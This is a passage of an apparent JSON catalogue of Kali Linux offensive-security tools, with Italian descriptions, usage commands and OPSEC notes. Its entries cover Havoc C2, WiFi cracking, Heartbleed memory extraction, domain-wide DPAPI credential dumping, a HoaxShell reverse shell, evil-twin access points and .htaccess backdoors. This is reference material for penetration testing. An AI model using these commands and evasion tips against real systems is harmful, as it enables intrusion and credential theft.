Forensi:</strong> Per contesti forensi professionali con requisiti di audit trail, considerare hashdeep che offre audit mode e matching positivo/negativo più sofisticato.</p><p><strong>Collision Awareness:</strong> MD5 e SHA-1 sono vulnerabili a collision attacks. Per evidenze forensi critiche, preferire SHA-256 o superiore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "havoc",
    "name": "havoc",
    "version": "0.6~git20240910.69ce17c",
    "icon": "../app/icons/havoc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/havoc/",
    "desc": "C2 framework moderno con GUI, demon agent, BOF support e evasion integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Havoc</strong> è un framework C2 (Command and Control) moderno con GUI nativa e agent \"Demon\" altamente evasivo. Supporta Beacon Object Files (BOF), sleep obfuscation, syscall indiretti e tecniche anti-forensics. Alternativa open source a Cobalt Strike con feature all'avanguardia.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Demon Agent:</strong> Implant con evasion integrata.</p><p><strong>BOF Support:</strong> Esegue Beacon Object Files.</p><p><strong>Sleep Obfuscation:</strong> Nasconde agent in memoria durante sleep.</p><p><strong>Syscall Evasion:</strong> Syscall indiretti per evitare EDR.</p><p><strong>GUI Interface:</strong> Interfaccia grafica nativa completa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia teamserver\nsudo ./havoc server --profile profiles/havoc.yaotl\n\n# Avvia client GUI\n./havoc client\n\n# Genera payload da GUI\n# Configura listener, genera Demon payload\n# Deploy su target, gestisci sessioni dalla GUI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 moderno con evasion avanzata.</p><p>Nel <strong>Adversary Simulation</strong>, simula APT con tecniche attuali.</p><p><strong>Research</strong> su tecniche offensive moderne.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Signature sempre più note, modifica per engagement reali. BOF community ampliano capacità. Attivamente sviluppato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "hcxtools",
    "name": "hcxtools",
    "version": "6.3.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hcxtools/",
    "desc": "Converte capture WiFi (PMKID, handshake) in formato hashcat per cracking veloce.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HCXtools</strong> è una suite di tool per conversione di capture WiFi in formato hashcat. Supporta PMKID (che non richiede handshake completo), handshake WPA/WPA2 e vari formati di capture. Essenziale per il workflow moderno di WiFi cracking con hashcat.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PMKID Extraction:</strong> Estrae PMKID per cracking senza client.</p><p><strong>Format Conversion:</strong> Da .cap/.pcapng a formato hashcat.</p><p><strong>hcxdumptool:</strong> Cattura ottimizzata per hashcat.</p><p><strong>Analysis:</strong> Analizza qualità dei capture.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti capture a formato hashcat\nhcxpcapngtool -o hash.hc22000 capture.pcapng\n\n# Cattura ottimizzata\nhcxdumptool -i wlan0mon -o capture.pcapng\n\n# Estrai solo PMKID\nhcxpcapngtool --pmkid-only -o pmkid.hc22000 capture.pcap\n\n# Poi cracka con hashcat\nhashcat -m 22000 hash.hc22000 wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Cracking</strong>, prepara capture per hashcat.</p><p>Nel <strong>PMKID Attack</strong>, cracka senza necessità di client.</p><p><strong>Wireless Assessment</strong> per testare robustezza password WiFi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Preprocessing:</strong> Tool di conversione locale. PMKID attack più veloce perché non richiede deauth.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "heartleech",
    "name": "heartleech",
    "version": "0~git20140607.3ab1d60",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/heartleech/",
    "desc": "Exploit Heartbleed per estrarre memoria dal server SSL e recuperare chiavi private.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Heartleech</strong> sfrutta la vulnerabilità Heartbleed (CVE-2014-0160) per estrarre memoria dal processo OpenSSL di server vulnerabili. Può recuperare chiavi private, session key, cookie e altri dati sensibili dalla memoria del server. Vulnerabilità storica ma server legacy potrebbero essere ancora vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Memory Extraction:</strong> Estrae 64KB di memoria per request.</p><p><strong>Private Key Recovery:</strong> Cerca chiavi private nella memoria.</p><p><strong>Automated:</strong> Loop automatico per massimizzare estrazione.</p><p><strong>Stealth Options:</strong> Modalità per ridurre detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test se vulnerabile\nheartleech -t target.com -p 443\n\n# Estrai memoria\nheartleech target.com -f memory_dump.bin\n\n# Cerca chiavi private\nheartleech target.com --autopwn\n\n# Loop continuo\nheartleech target.com -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Legacy Testing</strong>, verifica server vecchi non patchati.</p><p>Nel <strong>CTF</strong>, challenge su vulnerabilità storiche.</p><p><strong>Learning</strong> per capire impatto di Heartbleed.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Patched:</strong> La maggior parte dei server è patchata dal 2014. Sfruttamento lascia tracce nei log. Solo per testing autorizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "SSL_TLS"
    ],
    "notes": null
  },
  {
    "id": "hekatomb",
    "name": "hekatomb",
    "version": "1.5.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hekatomb/",
    "desc": "Estrae credenziali DPAPI da tutti i computer del dominio usando backup key del DC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hekatomb</strong> estrae credenziali protette da DPAPI da tutti i computer di un dominio AD usando la backup key del Domain Controller. Con accesso admin al DC, recupera la backup key che permette di decriptare DPAPI secret da qualsiasi macchina del dominio, incluse password browser, WiFi e certificati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Backup Key Extraction:</strong> Recupera DPAPI backup key dal DC.</p><p><strong>Domain-Wide:</strong> Decripta secret da tutte le macchine del dominio.</p><p><strong>Browser Passwords:</strong> Chrome, Edge, Firefox credentials.</p><p><strong>Certificates:</strong> Estrae certificati e chiavi private.</p><p><strong>WiFi Passwords:</strong> Credenziali WiFi salvate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrai da tutto il dominio\nhekatomb -d domain.local -u admin -p password -dc dc.domain.local\n\n# Solo specifici computer\nhekatomb -d domain.local -u admin -H NTLMHASH --computers targets.txt\n\n# Esporta risultati\nhekatomb -d domain.local -u admin -p pass -dc dc -o results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, post-exploitation massiva dopo domain admin.</p><p>Nel <strong>Credential Harvesting</strong>, raccoglie password da tutto il dominio.</p><p><strong>Lateral Movement</strong> con credenziali trovate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Admin Required:</strong> Richiede domain admin per backup key. Accessi SMB massivi potrebbero essere rilevati. Tool devastante post-compromise.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "hexinject",
    "name": "hexinject",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hexinject/",
    "desc": "Inietta pacchetti raw nella rete e sniffa traffico in formato hex per analisi manuale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HexInject</strong> è un tool per packet injection e sniffing a basso livello. Permette di iniettare pacchetti raw specificati in formato hex e catturare traffico visualizzandolo in hex per analisi manuale. Utile per crafting di pacchetti custom e debugging di protocolli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Injection:</strong> Inietta pacchetti raw hex.</p><p><strong>Hex Sniffing:</strong> Cattura traffico in formato hex.</p><p><strong>Raw Socket:</strong> Accesso a livello 2 e 3.</p><p><strong>Scripting:</strong> Integra con script per automazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Sniffa in hex\nhexinject -s -i eth0\n\n# Inietta pacchetto\necho \"ff ff ff ff ff ff 00 11 22 33 44 55 08 00 ...\" | hexinject -p -i eth0\n\n# Sniff e pipe a script\nhexinject -s -i eth0 | python analyze.py</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Protocol Research</strong>, analizza e crafta pacchetti manualmente.</p><p>Nel <strong>Exploit Development</strong>, testa payload a livello pacchetto.</p><p><strong>Network Debug</strong> per problemi di basso livello.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Low Level:</strong> Tool per esperti, richiede conoscenza protocolli. Injection può causare problemi di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "hoaxshell",
    "name": "hoaxshell",
    "version": "0.0~git20250119.e1bba89",
    "icon": "../app/icons/hoaxshell-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hoaxshell/",
    "desc": "Reverse shell via PowerShell che comunica con richieste HTTP per evitare detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HoaxShell</strong> genera reverse shell PowerShell che comunicano via HTTP request invece di socket tradizionali. Le shell utilizzano comandi PowerShell legittimi per fetch e post di comandi, rendendo il traffico simile a normale navigazione web e più difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Communication:</strong> Usa HTTP GET/POST invece di socket.</p><p><strong>PowerShell Native:</strong> Solo comandi PowerShell legittimi.</p><p><strong>Payload Generation:</strong> Genera vari tipi di payload.</p><p><strong>Constrained Mode Bypass:</strong> Opzioni per ambienti restrittivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia listener e genera payload\npython3 hoaxshell.py -s YOUR_IP -p 8080\n\n# Genera payload specifico\npython3 hoaxshell.py -s YOUR_IP -p 8080 -t cmd\n\n# Sul target, esegui payload PowerShell generato\n# Interagisci con shell via HTTP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, shell che bypassa firewall egress.</p><p>Nel <strong>Evasion</strong>, traffico HTTP meno sospetto di socket.</p><p><strong>Initial Access</strong> quando solo HTTP è permesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> PowerShell logging cattura ancora i comandi. HTTP può essere ispezionato da proxy. Considera offuscamento aggiuntivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "hostapd-mana",
    "name": "hostapd-mana",
    "version": "2.6.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostapd-mana/",
    "desc": "Hostapd patchato per creare rogue AP con KARMA attack e cattura credenziali EAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hostapd-MANA</strong> è hostapd patchato con supporto per KARMA attack, loud KARMA e cattura credenziali EAP. KARMA risponde a qualsiasi probe request, facendo connettere i client automaticamente. Include integrazione con sslstrip, responder e altri tool per attacchi wireless completi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>KARMA Attack:</strong> Risponde a tutti i probe request.</p><p><strong>Loud KARMA:</strong> Broadcast attivo di SSID richiesti.</p><p><strong>EAP Capture:</strong> Cattura credenziali enterprise.</p><p><strong>Integration:</strong> Funziona con sslstrip, responder.</p><p><strong>ACL Support:</strong> Whitelist/blacklist MAC address.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura hostapd-mana.conf con KARMA\ninterface=wlan0\nenable_mana=1\nmana_loud=1\n\n# Avvia\nhostapd-mana hostapd-mana.conf\n\n# Combina con dnsmasq per DHCP\n# e sslstrip per HTTPS stripping</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, crea rogue AP che cattura client automaticamente.</p><p>Nel <strong>Red Team</strong>, cattura credenziali in ambienti WiFi.</p><p><strong>Wireless Assessment</strong> per testare client security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> KARMA detectable da WIDS. Client moderni hanno protezioni. Richiede hardware compatibile AP mode.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hostapd-wpe",
    "name": "hostapd-wpe",
    "version": "2.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostapd-wpe/",
    "desc": "Hostapd con Wireless Pwnage Edition patch per evil twin e credential harvesting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hostapd-WPE</strong> (Wireless Pwnage Edition) è hostapd patchato per attacchi evil twin su reti WPA2-Enterprise. Cattura credenziali EAP (PEAP, EAP-TTLS, EAP-TLS) dai client che si connettono al fake AP. I challenge/response catturati possono essere crackati offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin:</strong> Clona SSID enterprise per attacchi.</p><p><strong>EAP Logging:</strong> Cattura tutti i tentativi di autenticazione.</p><p><strong>MSCHAPv2:</strong> Cattura challenge/response per cracking.</p><p><strong>Certificate:</strong> Usa certificati self-signed.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura hostapd-wpe.conf\ninterface=wlan0\nssid=CorpWiFi\nwpa=2\nwpa_key_mgmt=WPA-EAP\n\n# Avvia\nhostapd-wpe hostapd-wpe.conf\n\n# Credenziali in /var/log/hostapd-wpe.log\n# Cracka MSCHAPv2 con hashcat -m 5500</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, attacca reti enterprise.</p><p>Nel <strong>Red Team</strong>, ottiene credenziali domain.</p><p><strong>Assessment</strong> di sicurezza client WiFi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Certificate mismatch può alertare utenti. WIDS rileva rogue AP. Usa eaphammer per setup più semplice.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hosthunter",
    "name": "hosthunter",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hosthunter/",
    "desc": "Trova hostname associati a IP usando reverse DNS, SSL cert e API web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HostHunter</strong> è uno strumento Python per la discovery di hostname e domini associati a indirizzi IP utilizzando multiple fonti di intelligence. Combina reverse DNS lookup, analisi dei certificati SSL/TLS, query a VirusTotal API, e ricerche su Bing per identificare tutti i virtual host e domini ospitati su un determinato server. Questo è particolarmente utile durante la fase di reconnaissance quando si dispone solo di un indirizzo IP e si vogliono scoprire tutti i siti web ospitati, essenziale per ampliare la superficie di attacco in penetration testing e bug bounty.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Intelligence:</strong> Interroga simultaneamente multiple fonti per massimizzare i risultati: reverse DNS per i PTR record, analisi dei certificati SSL per estrarre CN e SAN, VirusTotal per dati storici, e Bing per hostname indicizzati. La correlazione tra fonti riduce i falsi negativi.</p><p><strong>SSL Certificate Analysis:</strong> Si connette alla porta 443 di ogni IP e analizza il certificato SSL/TLS, estraendo il Common Name (CN) e tutti i Subject Alternative Names (SAN). Questo rivela spesso hostname che non appaiono in DNS pubblici.</p><p><strong>Batch Processing:</strong> Può processare liste di migliaia di IP in modo efficiente con threading parallelo. Supporta input da file con un IP per riga e gestisce automaticamente timeout ed errori.</p><p><strong>Flexible Output:</strong> Esporta i risultati in formato CSV per analisi in spreadsheet, TXT per pipeline con altri tool, o output diretto su console. Include metadati come la fonte di ogni hostname trovato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HostHunter supporta sia analisi di singoli IP che elaborazione batch di liste.</p><pre><code># === SINGOLO IP ===\nhosthunter -i 93.184.216.34\n\n# === LISTA DI IP ===\n# Da file con un IP per riga\nhosthunter -f ip_list.txt\n\n# === OUTPUT FORMATTATO ===\n# Output CSV\nhosthunter -f ips.txt -o results.csv\n\n# Output TXT\nhosthunter -f ips.txt -o results.txt\n\n# === INTEGRAZIONI API ===\n# Con VirusTotal per dati aggiuntivi\nhosthunter -f ips.txt --vt-key YOUR_VIRUSTOTAL_API_KEY\n\n# === OPZIONI AVANZATE ===\n# Aumenta il threading per velocità\nhosthunter -f ips.txt -t 50\n\n# Solo SSL analysis (più silenzioso)\nhosthunter -f ips.txt --ssl-only\n\n# === PIPELINE ===\n# Combina con altri tool\nnmap -sL -n 192.168.1.0/24 | awk '{print $5}' > ips.txt\nhosthunter -f ips.txt -o hosts.csv</code></pre><p>I risultati mostrano ogni hostname trovato con l'IP associato e la fonte della discovery.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Asset Discovery</strong>, quando si ha un range IP di un'organizzazione, HostHunter rivela tutti i virtual host e domini ospitati, espandendo significativamente la superficie di attacco conosciuta oltre i domini già noti.</p><p>Nel <strong>Bug Bounty</strong>, trovare altri siti web sullo stesso server può rivelare applicazioni legacy, staging environment, o siti dimenticati che potrebbero avere vulnerabilità più facili da sfruttare rispetto al target principale.</p><p>Durante <strong>Penetration Testing</strong>, la discovery di hostname permette di identificare applicazioni web che potrebbero essere vulnerabili a host header injection, virtual host routing issues, o che espongono informazioni sensibili.</p><p>Per <strong>Threat Intelligence</strong>, correlare IP di infrastrutture malevole con i domini associati aiuta a mappare l'intera infrastruttura di un threat actor.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Profilo Misto:</strong> Il tool utilizza sia tecniche passive che attive. Le query DNS reverse e VirusTotal sono passive e non raggiungono il target. L'analisi SSL richiede connessione diretta al target sulla porta 443, generando log sul server.</p><p><strong>Rate Limiting:</strong> VirusTotal ha limiti sulle API gratuite (4 query/minuto). Le query Bing possono essere bloccate se troppo aggressive. Usare delay tra le richieste per evitare blocchi.</p><p><strong>Completezza Risultati:</strong> I risultati dipendono dalla disponibilità delle fonti. Certificati self-signed, IP senza PTR record, o servizi non indicizzati non verranno rilevati. Usare in combinazione con altri tool di enumeration.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "hostsman",
    "name": "hostsman",
    "version": "1.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostsman/",
    "desc": "Enumera virtual host su web server analizzando risposte HTTP a diversi hostname.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HostsMan</strong> è uno strumento specializzato per l'enumerazione di virtual host (vhost) su web server. Sfrutta il fatto che molti server web ospitano più siti sullo stesso IP, differenziandoli tramite l'header HTTP Host. Inviando richieste con hostname diversi da una wordlist, HostsMan identifica vhost nascosti o non pubblicamente linkati che rispondono sullo stesso server target, espandendo significativamente la superficie d'attacco durante un assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Header Fuzzing:</strong> Invia richieste HTTP identiche variando solo l'header Host con valori da una wordlist. Questo permette di scoprire siti configurati sul server che non hanno record DNS pubblici o non sono linkati da altre pagine.</p><p><strong>Response Comparison:</strong> Analizza le risposte HTTP (status code, content length, contenuto) per identificare hostname che producono risposte diverse dalla baseline, indicando la presenza di un vhost configurato.</p><p><strong>Smart Filtering:</strong> Supporta filtri per status code, lunghezza della risposta, e pattern nel contenuto per eliminare falsi positivi e concentrarsi solo su vhost realmente diversi.</p><p><strong>SSL/TLS Support:</strong> Funziona trasparentemente su connessioni HTTPS, importante per server moderni che usano TLS. Può ignorare errori di certificato per vhost con certificati self-signed o mismatch.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HostsMan richiede l'URL target e una wordlist di potenziali hostname.</p><pre><code># Enumerazione vhost base\nhostsman -u http://192.168.1.100 -w vhosts.txt\n\n# Su HTTPS con ignore certificate errors\nhostsman -u https://target.com -w vhosts.txt -k\n\n# Filtra risposte 404 (non trovato)\nhostsman -u http://target.com -w vhosts.txt --fc 404\n\n# Filtra per content length (es. pagina default)\nhostsman -u http://target.com -w vhosts.txt --fl 1234\n\n# Output verbose con dettagli risposte\nhostsman -u http://target.com -w vhosts.txt -v\n\n# Usa dominio base per generare varianti\nhostsman -u http://target.com -w common_prefixes.txt --domain target.com</code></pre><p>Le wordlist efficaci includono: prefissi comuni (dev, staging, admin, api, test), nomi applicativi, e varianti del dominio principale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Bug Bounty</strong>, molti programmi considerano in-scope tutti i vhost sugli stessi server dei target principali. Scoprire dev.target.com o api-internal.target.com può rivelare applicazioni meno protette con vulnerabilità facili.</p><p>Nel <strong>Penetration Testing</strong>, l'enumerazione vhost è parte essenziale della fase di reconnaissance, rivelando applicazioni interne, pannelli admin, o ambienti di staging accessibili dall'esterno.</p><p>Per <strong>Asset Discovery</strong>, aiuta a mappare completamente l'infrastruttura web di un'organizzazione, identificando applicazioni dimenticate o non documentate.</p><p>Durante <strong>Red Team Operations</strong>, vhost nascosti spesso hanno controlli di sicurezza più deboli e possono fornire punti d'ingresso alternativi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico HTTP attivo verso il target. Il pattern di richieste con Host header variabili può essere identificato da WAF e sistemi di logging. Il volume di richieste dipende dalla dimensione della wordlist.</p><p><strong>Alternative:</strong> Tool simili includono gobuster con modalità vhost, ffuf con fuzzing dell'header Host, e wfuzz. La scelta dipende dalle preferenze e dalle funzionalità specifiche necessarie.</p><p><strong>Impatto:</strong> Basso. Le richieste sono leggere e non causano carico significativo. Tuttavia, wordlist molto grandi possono generare traffico notevole.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "htshells",
    "name": "htshells",
    "version": "0.1~git20131205",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/htshells/",
    "desc": "Collezione di .htaccess backdoor per eseguire comandi su server Apache vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTShells</strong> è una collezione di file .htaccess malevoli per ottenere code execution su server Apache misconfigured. Sfrutta direttive Apache come AddHandler, php_flag e altre per eseguire PHP o CGI quando .htaccess upload è permesso e non filtrato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Techniques:</strong> Varie tecniche .htaccess per RCE.</p><p><strong>Apache Specific:</strong> Sfrutta feature Apache.</p><p><strong>Bypass Filters:</strong> Varie tecniche per bypass filtri upload.</p><p><strong>Ready to Use:</strong> File pronti per upload e test.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># I file sono in /usr/share/htshells/\nls /usr/share/htshells/\n\n# Esempio: se puoi uploadare .htaccess\n# Carica shell.htaccess come .htaccess\n# Poi accedi a shell.gif (rinominato .php)\n\n# Studia le tecniche nei file per capire come funzionano</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Exploitation</strong>, RCE via upload misconfiguration.</p><p>Nel <strong>CTF</strong>, challenge su upload filter bypass.</p><p><strong>Learning</strong> su Apache security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Specifico:</strong> Funziona solo su Apache con AllowOverride. Server moderni spesso limitano .htaccess. Verifica configurazione target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "httprint",
    "name": "httprint",
    "version": "0.301",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httprint/",
    "desc": "Web server fingerprinting tool che identifica software anche dietro reverse proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTTPrint</strong> è un tool per web server fingerprinting che identifica il software del server analizzando comportamenti HTTP caratteristici. Usa tecniche di signature matching che funzionano anche quando il server nasconde il banner o è dietro reverse proxy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature Matching:</strong> Database di signature per server comuni.</p><p><strong>Behavior Analysis:</strong> Analizza risposte a request anomale.</p><p><strong>Banner Bypass:</strong> Identifica anche con banner nascosto.</p><p><strong>Proxy Detection:</strong> Rileva reverse proxy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint singolo server\nhttprint -h target.com -s signatures.txt\n\n# Su porta specifica\nhttprint -h target.com:8080 -s signatures.txt\n\n# HTTPS\nhttprint -h target.com -P0 -s signatures.txt\n\n# Output HTML\nhttprint -h target.com -s signatures.txt -o report.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, identifica web server per selezionare exploit.</p><p>Nel <strong>Vulnerability Assessment</strong>, determina versioni per CVE matching.</p><p><strong>Pentest</strong> quando banner è nascosto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Invia request HTTP anomale, può essere loggato. Tool datato, considera alternative come Wappalyzer, WhatWeb.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httprobe",
    "name": "httprobe",
    "version": "0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httprobe/",
    "desc": "Verifica rapidamente quali domini di una lista hanno server HTTP/HTTPS attivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTTProbe</strong> verifica rapidamente quali domini di una lista hanno server HTTP o HTTPS attivi. Prende input da stdin e output i domini che rispondono. Perfetto per filtrare output di tool di subdomain enumeration prima di ulteriore analisi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Probing:</strong> Verifica veloce di molti domini.</p><p><strong>HTTP/HTTPS:</strong> Testa entrambi i protocolli.</p><p><strong>Stdin/Stdout:</strong> Perfetto per pipeline.</p><p><strong>Concurrent:</strong> Request parallele per velocità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Verifica quali domini rispondono\ncat subdomains.txt | httprobe\n\n# Solo HTTPS\ncat subdomains.txt | httprobe -s -p https:443\n\n# Porte custom\ncat subs.txt | httprobe -p http:8080 -p https:8443\n\n# Pipeline completa\nsubfinder -d target.com | httprobe | nuclei</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Validation</strong>, filtra subdomain con web server attivo.</p><p>Nel <strong>Bug Bounty</strong>, focus su target raggiungibili.</p><p><strong>Pipeline</strong> come step intermedio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni HTTP a tutti i domini testati. Genera traffico significativo su grandi liste. Rate limiting consigliato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httpx-toolkit",
    "name": "httpx-toolkit",
    "version": "1.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httpx-toolkit/",
    "desc": "HTTP probe velocissimo con estrazione titolo, status code, tecnologie e screenshot.",
